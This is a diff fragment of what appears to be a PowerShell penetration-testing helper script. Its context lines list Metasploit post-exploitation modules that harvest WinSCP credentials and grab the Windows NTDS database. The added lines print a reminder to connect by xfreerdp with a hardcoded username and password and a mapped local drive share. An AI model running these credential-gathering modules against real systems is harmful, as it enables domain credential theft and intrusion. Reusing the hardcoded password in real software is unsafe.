@@ -29,3 +29,7 @@ run post/windows/gather/credentials/winscp
 run post/windows/gather/ntds_location
 run post/windows/gather/ntds_grabber
 "@
+
+Write-Host -NoNewline -ForegroundColor DarkGreen " [REMINDER] --- "
+Write-Host -ForegroundColor Yellow "Login using XFREERDP with a share:"
+Write-Host -ForegroundColor DarkYellow "xfreerdp /u:crimson /p:ASDqwe123 /w:1920 /h:1080 /dynamic-resolution /v:IP /bpp:8 /network:modem /compression -themes -wallpaper /auto-reconnect -glyph-cache /clipboard /audio-mode:1 /relax-order-checks /drive:share,/home/karmaz95/share"
